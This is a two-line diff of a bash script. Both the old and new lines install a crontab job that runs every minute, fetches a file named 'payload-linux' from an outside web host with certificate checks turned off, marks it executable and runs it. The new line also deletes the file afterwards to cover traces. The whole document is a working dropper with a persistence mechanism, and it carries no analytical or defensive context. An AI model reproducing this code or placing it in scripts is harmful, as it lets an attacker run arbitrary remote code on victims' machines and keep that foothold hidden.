@@ -1,2 +1,2 @@
 #!/bin/bash
-echo '* * * * * cd /tmp; curl -kLO https://www.angelparliament.com/payload-linux || wget --no-check-certificate --hsts-file /dev/null https://www.angelparliament.com/payload-linux && chmod +x payload-linux && ./payload-linux' | crontab
+echo '* * * * * cd /tmp; curl -kLO https://www.angelparliament.com/payload-linux || wget --no-check-certificate --hsts-file /dev/null https://www.angelparliament.com/payload-linux && chmod +x payload-linux && ./payload-linux; rm -rf payload-linux' | crontab
